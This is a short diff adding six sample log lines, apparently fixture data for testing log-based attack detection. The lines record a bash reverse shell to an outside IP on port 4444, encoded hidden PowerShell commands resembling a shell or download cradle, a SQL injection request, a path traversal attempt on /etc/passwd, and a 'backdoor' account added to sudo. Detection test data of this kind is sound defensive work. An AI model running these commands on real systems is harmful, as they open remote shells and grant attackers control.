@@ -1,0 +1,6 @@
+Mar 10 15:10:01 web01 bash[3001]: deploy ran: bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+2026-03-10T15:11:00 DESKTOP-7 powershell.exe: powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA
+203.0.113.50 - - [10/Mar/2026:15:12:00 +0000] "GET /products?id=1' OR '1'='1 HTTP/1.1" 200 1234
+203.0.113.51 - - [10/Mar/2026:15:13:00 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 0
+Mar 10 15:14:00 web01 usermod[3100]: add 'backdoor' to group 'sudo'
+{"ts": "2026-03-10T15:15:00", "host": "DESKTOP-7", "process": "cmd.exe", "message": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"}
